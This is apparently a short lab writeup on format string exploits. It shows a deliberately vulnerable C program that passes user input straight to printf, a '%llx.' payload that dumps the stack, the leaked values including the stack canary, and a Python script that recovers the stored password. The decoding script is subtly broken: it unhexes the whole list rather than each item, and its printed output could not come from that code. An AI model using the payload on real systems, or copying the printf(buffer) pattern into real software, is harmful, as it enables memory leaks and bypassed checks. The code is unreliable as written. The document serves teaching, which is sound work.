## fmt string exploits, reading from the stack

this is going to be a very short writeup, as this is a pretty simple concept

lets check out the script we are going to be exploiting

pass.c:
```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char**argv){
    setvbuf(stdout, NULL, _IONBF, 0);
    char pass[]="j0t4r0\n";
    int *ptr=pass;  // write password to stack

    char buffer[256];
    printf("Enter the password: ");
    read(0, buffer, 256);
    if (strcmp(buffer, pass)!=0) {
        printf(buffer);
        exit(0);
    }
    printf("C0ngr4tz!");
    return 0;
}

```
what this script does, is it reads in 256 bytes into a 256 byte buffer
then calls printf, this is vulnerable due to the fact that we can supply

our own format string which allows us a lot of possibilities.
one of these possiblities are arbitrary reads, where we can read from the stack

as we can see, the password is "j0t4r0", and will be pushed/written on the stack
the first thing we should do is test out our exploit
```py
python2 -c 'print"%llx."*100' | ./a.out
```
the format string i am going to be using here is %llx, this stands for long long hex
the reason for using this is that this is an x64 binary, so i would need to read 8 bytes
to get the full address. 

I am also using %x, which stands for hexadecimal, so i can
convert the values on the stack while also getting the addresses.

the reason i had used a "." after each format string was so that i could see which values were what

lets check out output:
```
Enter the password: 7ffdf4556308.6a.ffffffff.0.7f0f9eef6070.7ffdf4556518.100000003.7ffdf4556308.a30723474306a.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.7ffdf4556510.5bc8ebf0ab9c2b00.0.7f0f9ed0bb25.7ffdf4556518.1f45e3000.5633f77e9189.7ffdf4556889.5633f77e9290.5a29d1bf32d2cc1c
```
this at first just looks like a mess, but there is valuable data here, just by looking around we can
see that we leaked the stack canary, 5bc8ebf0ab9c2b00, since they always end with a null byte in little
endianess

now that we have noted that everything here is in little endian, lets try and find our password within
this garbled mess

lets write a python script for this
```py
from pwn import unhex

fmtdata="7ffdf4556308.6a.ffffffff.0.7f0f9eef6070.7ffdf4556518.100000003.7ffdf4556308.a30723474306a.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.7ffdf4556510.5bc8ebf0ab9c2b00.0.7f0f9ed0bb25.7ffdf4556518.1f45e3000.5633f77e9189.7ffdf4556889.5633f77e9290.5a29d1bf32d2cc1c".split(".")
try:
    for i in fmtdata:
        print(unhex(fmtdata)[::-1])
except:
    print("Error, maybe check if there are any non decimal values?")
```
lets see the output:
```
b'\x08cU\xf4\xfd\x7f'
b'j'
b'\xff\xff\xff\xff'
b'\x00'
b'p`\xef\x9e\x0f\x7f'
b'\x18eU\xf4\xfd\x7f'
b'\x03\x00\x00\x00\x01'
b'\x08cU\xf4\xfd\x7f'
b'j0t4r0\n'

--- snip ---

b'\x10eU\xf4\xfd\x7f'
b'\x00+\x9c\xab\xf0\xeb\xc8['
b'\x00'
b'%\xbb\xd0\x9e\x0f\x7f'
b'\x18eU\xf4\xfd\x7f'
b'\x000^\xf4\x01'
b'\x89\x91~\xf73V'
b'\x89hU\xf4\xfd\x7f'
b'\x90\x92~\xf73V'
b'\x1c\xcc\xd22\xbf\xd1)Z'
```
and there we go!

we see our password: b'j0t4r0\n'

lets run the binary and get our congratz :D
```bash
root@root~# ./a.out
Enter the password: j0t4r0
C0ngr4tz!
```
nice!
